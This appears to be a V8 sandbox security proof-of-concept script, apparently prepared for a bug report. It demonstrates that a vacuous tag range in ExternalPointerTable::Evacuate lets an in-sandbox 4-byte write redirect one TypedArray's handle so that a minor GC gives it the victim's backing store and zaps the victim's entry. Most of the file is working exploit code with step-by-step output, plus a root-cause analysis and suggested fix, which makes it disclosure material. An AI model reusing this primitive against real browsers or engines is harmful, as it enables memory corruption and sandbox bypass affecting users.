// ExternalPointerTable::Evacuate — Vacuous SBXCHECK PoC
//
// Bug:    src/heap/minor-mark-sweep.cc:848
//           table.Evacuate(young, old, handle, handle_location,
//                          EvacuateMarkMode::kClearMark,
//                          kAnyExternalPointerTagRange);           ← the problem
//
//         kAnyExternalPointerTagRange = [kFirstExternalPointerTag=0x00,
//                                        kLastExternalPointerTag=0x7f]
//         This range includes ALL internal sentinel tags:
//           kExternalPointerZappedEntryTag     = 0x7d
//           kExternalPointerEvacuationEntryTag = 0x7e
//           kExternalPointerFreeEntryTag       = 0x7f
//
// Two SBXCHECK guards that exist to reject mis-tagged entries are vacuous:
//   external-pointer-table-inl.h:299
//     SBXCHECK(at(from_index).HasExternalPointer(tag_range))
//   external-pointer-table-inl.h:304
//     SBXCHECK(old_payload.IsTaggedWithTagIn(tag_range))
//
//   Both trivially pass for every tag in [0x00, 0x7f] — the entire tag space.
//
// HasExternalPointer() (external-pointer-table-inl.h:46-47) has DCHECKs that
// explicitly assert the range must NOT include the internal sentinels:
//   DCHECK(!tag_range.Contains(kExternalPointerFreeEntryTag))
//   DCHECK(!tag_range.Contains(kExternalPointerEvacuationEntryTag))
// These DCHECKs are stripped in release builds — the caller violates the
// contract with no release-build enforcement.
//
// Attack surface:
//   ExternalPointerHandle is a 4-byte field written inside the sandbox.
//   Any in-sandbox write primitive (e.g. cage_base elevation b/587465323)
//   can overwrite it.  When a surviving young object's handle field is
//   redirected to point at a victim's young EPT entry, the next minor GC
//   evacuates the VICTIM's entry instead of the attacker's, zapping it.
//
//   The result is a cross-object backing-store aliasing primitive:
//     - attacker TypedArray gains read/write access to victim's memory, AND
//     - victim TypedArray's EPT entry is zapped → its backing store pointer
//       becomes null, causing a null-deref or SBXCHECK abort on next access.
//
// CWE-863 (Incorrect Authorization)   Severity: MEDIUM
//
// Run:
//   ./out/x64.release/d8 --run-as-sandbox-security-poc --expose-gc --minor-ms \
//       ept_evacuate_poc.js

'use strict';

// ─── Sandbox primitives ────────────────────────────────────────────────────────
const cageView = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const readU32  = (off) => cageView.getUint32(Number(off), /*le=*/true);
const writeU32 = (off, v) => cageView.setUint32(Number(off), v >>> 0, /*le=*/true);

const kTypedArrayType = Sandbox.getInstanceTypeIdFor('JS_TYPED_ARRAY_TYPE');
const kEPOffset       = Sandbox.getFieldOffset(kTypedArrayType, 'external_pointer');

print(`[*] JSTypedArray::external_pointer field offset = ${kEPOffset} (0x${kEPOffset.toString(16)})`);

// Objects must stay rooted so GC doesn't collect them before we're done.
const keepAlive = [];

// ─── STEP 1: Create the "attacker" TypedArray in young space ───────────────────
// Its external_pointer field will be tracked by the MinorMS marking visitor
// (young-generation-marking-visitor-inl.h:91 VisitExternalPointer) which records
// the slot's address in the SURVIVOR_TO_EXTERNAL_POINTER remembered set when the
// object is marked live during a minor GC.
const attackerAb = new ArrayBuffer(0x100);
const attacker   = new Uint8Array(attackerAb);
attacker.fill(0x11);
keepAlive.push(attacker, attackerAb);

// ─── STEP 2: Survive one minor GC ─────────────────────────────────────────────
// Minor GC #1 runs with --minor-ms:
//   Marking  → VisitExternalPointer marks E_attacker in young EPT space and
//               inserts &attacker.external_pointer into SURVIVOR_TO_EXTERNAL_POINTER
//   Sweeping → EvacuateExternalPointerReferencesDuringSweeping evacuates E_attacker
//               to old EPT space; attacker.external_pointer ← old-space handle
//
// After this GC, attacker.external_pointer points to an OLD-SPACE EPT entry.
gc({type: 'minor'});

const attackerAddr      = Sandbox.getAddressOf(attacker);
const attackerHandleOff = attackerAddr + kEPOffset;
const attackerHandle1   = readU32(attackerHandleOff);  // old-space handle after GC #1

print(`\n[*] After minor GC #1:`);
print(`    attacker @ cage+0x${attackerAddr.toString(16)}`);
print(`    attacker.external_pointer handle = 0x${attackerHandle1.toString(16)}`);
print(`    attacker[0] = 0x${attacker[0].toString(16)}`);

// ─── STEP 3: Create victim TypedArray AFTER the first GC ──────────────────────
// victim's EPT entry is freshly allocated in young EPT space.
// victim's backing store is filled with 0x41 ('A') as a sentinel.
const victimAb = new ArrayBuffer(0x100);
const victim   = new Uint8Array(victimAb);
victim.fill(0x41);
keepAlive.push(victim, victimAb);

const victimAddr      = Sandbox.getAddressOf(victim);
const victimHandleOff = victimAddr + kEPOffset;
const victimHandle    = readU32(victimHandleOff);  // young-space handle

print(`\n[*] victim @ cage+0x${victimAddr.toString(16)}`);
print(`    victim.external_pointer handle   = 0x${victimHandle.toString(16)}`);
print(`    victim[0] = 0x${victim[0].toString(16)} (0x41 sentinel, backing store alive)`);

// ─── STEP 4: In-sandbox write — redirect attacker's EP handle to victim ────────
// This is the ONLY exploitation primitive required: a 4-byte write anywhere
// within the V8 sandbox.  Any in-sandbox bug (e.g. cage_base elevation from
// b/587465323) provides this.
//
// We overwrite attacker's OLD-SPACE handle with victim's YOUNG-SPACE handle.
// When the next minor GC processes attacker's slot, it will read victimHandle
// and evacuate the VICTIM's young EPT entry, not attacker's own.
writeU32(attackerHandleOff, victimHandle);

print(`\n[+] CORRUPT: attacker.external_pointer handle`);
print(`    0x${attackerHandle1.toString(16)} (attacker's old-space handle)`);
print(`    → 0x${victimHandle.toString(16)}  (victim's young-space handle)`);

// ─── STEP 5: Trigger minor GC #2 ─────────────────────────────────────────────
//
// MinorMS marking:
//   VisitExternalPointer(attacker) reads victimHandle from attacker's field.
//   Calls table.Mark(young_space, victimHandle, &attacker.EP, range) →
//   marks victim's young EPT entry for evacuation, re-inserts
//   &attacker.external_pointer into SURVIVOR_TO_EXTERNAL_POINTER.
//
// MinorMS sweeping:
//   EvacuateExternalPointerReferencesDuringSweeping iterates the remset.
//
//   For attacker's slot (handle_location = &attacker.external_pointer):
//     handle = *handle_location = victimHandle          ← read from corrupted field
//
//   Evacuate(young_space, old_space, victimHandle,
//            &attacker.external_pointer,
//            kClearMark,
//            kAnyExternalPointerTagRange):              ← the vacuous range
//
//     line 296:  from_index = HandleToIndex(victimHandle)
//     line 298:  from_space->Contains(from_index) == TRUE (young EPT entry)
//     line 303:  old_payload = at(from_index).GetRawPayload()
//                            = {victim_backing_store, kTypedArrayExternalPointerTag | mark}
//     line 304:  SBXCHECK(old_payload.IsTaggedWithTagIn(kAnyExternalPointerTagRange))
//                IsTaggedWithTagIn([0,0x7f]) → TRUE for ANY tag ← VACUOUS
//     line 306:  to_index = AllocateEntry(old_space)       → E_new in old EPT space
//     line 309:  zapped_payload = {kNullAddress, kExternalPointerZappedEntryTag}
//     line 315:  SBXCHECK(CAS(old_payload → zapped_payload))
//                → victim's young EPT entry is now ZAPPED
//     line 322:  old_payload.ClearMarkBit()
//     line 327:  at(E_new).SetRawPayload(old_payload)
//                → E_new = {victim_backing_store, kTypedArrayExternalPointerTag}
//     line 335:  attacker.external_pointer ← IndexToHandle(E_new)
//
//   Result:
//     • victim's young EPT entry: ZAPPED (kNullAddress + kZappedTag)
//     • E_new (old EPT):          victim's original backing store + correct type tag
//     • attacker.external_pointer:  updated to handle(E_new)
//
print(`\n[*] Triggering minor GC #2 (--minor-ms)...`);
gc({type: 'minor'});
print(`[*] Minor GC #2 complete.`);

// ─── STEP 6: Verify ────────────────────────────────────────────────────────────
const attackerHandle2 = readU32(attackerHandleOff);
const victimHandleAfter = readU32(victimHandleOff);
const handleChanged = (attackerHandle2 !== attackerHandle1) &&
                      (attackerHandle2 !== victimHandle);

print(`\n[*] Post-attack EPT state:`);
print(`    attacker.EP handle before GC #1: 0x${attackerHandle1.toString(16)} (old-space)`);
print(`    attacker.EP handle after  GC #2: 0x${attackerHandle2.toString(16)}`);
print(`    ${handleChanged
    ? '← NEW old-space handle (Evacuate updated it to point at E_new) ✓'
    : (attackerHandle2 === victimHandle
       ? '← still victimHandle — Evacuate may not have run on this platform'
       : '← unchanged (unexpected)')}`);

// attacker now aliases victim's backing store via E_new.
// Reads through attacker go to victim's ArrayBuffer memory.
const attackerVal = attacker[0];
print(`\n    attacker[0] = 0x${attackerVal.toString(16)}`);
print(`    (was 0x11 — attacker's own data)`);
print(`    (victim filled with 0x41)`);

if (attackerVal === 0x41) {
  print(`\n[+] ══════════════════════════════════════════════════════════`);
  print(`[+]  CONFIRMED: attacker[0] = 0x41 — reads VICTIM'S backing store`);
  print(`[+]  Evacuate(kAnyExternalPointerTagRange) evacuated victim's EPT`);
  print(`[+]  entry without firing either SBXCHECK (both are vacuous).`);
  print(`[+] ══════════════════════════════════════════════════════════`);
} else if (attackerVal === 0x11) {
  print(`\n[-] attacker[0] still 0x11 — attack may not have taken effect.`);
  print(`    Check: was --minor-ms passed? Did attacker survive GC #1?`);
} else {
  print(`\n[?] Unexpected value — partial effect or different heap layout.`);
}

// victim's young EPT entry was ZAPPED in the attack.
// Accessing victim[0] will now either:
//   • In sandbox mode:    SBXCHECK abort in EPT::Get (zapped tag ≠ expected tag)
//   • In non-sandbox mode: null-pointer dereference (zapped entry = kNullAddress)
// We demonstrate this only after printing the main result above, since the
// SBXCHECK terminates the process (cannot be caught by JS try/catch).
print(`\n[*] victim.EP handle (unchanged in victim's field): 0x${victimHandleAfter.toString(16)}`);
print(`    The young EPT entry at that index was ZAPPED by the attack.`);
print(`    Accessing victim[0] will SBXCHECK-abort (sandbox) or crash (non-sandbox).`);
print(`    Skipping direct access to avoid process termination before summary.`);

print(`\n── Root Cause ───────────────────────────────────────────────────────────`);
print(` File:  src/heap/minor-mark-sweep.cc:848`);
print(` Call:  table.Evacuate(..., kAnyExternalPointerTagRange)`);
print(`        kAnyExternalPointerTagRange = [0x00, 0x7f] = ALL external pointer tags`);
print(``);
print(` Guards made vacuous:`);
print(`   external-pointer-table-inl.h:299`);
print(`   SBXCHECK(at(from_index).HasExternalPointer(kAnyExternalPointerTagRange))`);
print(`   → trivially TRUE for every entry regardless of its actual tag`);
print(``);
print(`   external-pointer-table-inl.h:304`);
print(`   SBXCHECK(old_payload.IsTaggedWithTagIn(kAnyExternalPointerTagRange))`);
print(`   → trivially TRUE; also passes for kZappedEntryTag=0x7d, kFreeEntryTag=0x7f`);
print(``);
print(` DCHECKs in HasExternalPointer() (lines 46-47) assert the range must exclude`);
print(` internal sentinels — violated in release builds by this caller.`);
print(``);
print(` Fix: pass the actual tag of the object's external pointer field, e.g.:`);
print(`   kAnyExternalPointerTagRange → slot_tag_range (derived from object layout)`);
print(`   Or: add a release-build range validity check in Evacuate() itself.`);
print(``);
print(` CWE-863 (Incorrect Authorization)   Severity: MEDIUM`);
